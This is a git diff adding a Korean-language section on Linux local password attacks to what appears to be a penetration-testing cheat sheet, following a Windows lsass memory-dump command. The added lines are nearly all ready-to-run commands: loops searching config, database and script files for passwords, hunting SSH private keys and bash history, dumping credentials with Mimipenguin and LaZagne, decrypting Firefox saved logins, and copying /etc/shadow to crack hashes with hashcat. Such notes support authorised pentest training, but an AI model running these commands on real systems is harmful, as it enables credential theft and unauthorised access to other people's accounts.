@@ -197,3 +197,84 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 
 <br/><br/>
 # Linux Local Password Attacks
+
+## 파일 검색
+
+### 구성 파일 검색
+```for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done```
+
+### 구성 파일에서 자격증명 검색 (예 : .cnf)
+```for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done```
+
+### DB 파일 검색
+```for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done```
+
+### 노트 검색 (확장자가 없는 파일 포함)
+```find /home/* -type f -name "*.txt" -o ! -name "*.*"```
+
+### 스크립트 검색
+```for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done```
+
+### Cronjobs 검색
+```cat /etc/crontab```<br/>
+```ls -la /etc/cron.*/```
+
+### SSH Private Keys 검색
+```grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"```
+
+### SSH Public Keys 검색
+```grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"```
+
+### Bash History 확인
+```tail -n5 /home/*/.bash*```
+
+### Log에서 특정 문자열 검색
+```for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done```
+<br/><br/>
+## Memory & Cache 검색
+
+### Memory - Mimipenguin
+```python3 mimipenguin.py```
+
+### Memory - LaZagne
+```python2.7 laZagne.py all```
+<br/><br/>
+## Browsers 검색
+
+### Firefox에 저장된 자격증명 검색
+```
+ls -l .mozilla/firefox/ | grep default
+cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+```
+
+### Firefox에 저장된 자격증명 Decrypt
+```python3.9 firefox_decrypt.py```
+
+### Browsers - LaZagne
+```python3 laZagne.py browsers```
+<br/><br/>
+## Shadow 파일
+- `$<type>$<salt>$<hashed>`
+
+### Algorithm Types
+- `$1$` – MD5
+- `$2a$` – Blowfish
+- `$2y$` – Eksblowfish
+- `$5$` – SHA-256
+- `$6$` – SHA-512
+
+### 저장된 오래된 비밀번호 확인
+```cat /etc/security/opasswd```
+<br/><br/>
+## Shadow 파일
+
+### Unshadow, Hashcat으로 Cracking
+```
+sudo cp /etc/passwd /tmp/passwd.bak 
+sudo cp /etc/shadow /tmp/shadow.bak 
+unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
+```
+
+### Hashcat으로 MD5 Hash Cracking
+```hashcat -m 500 -a 0 md5-hashes.list rockyou.txt```
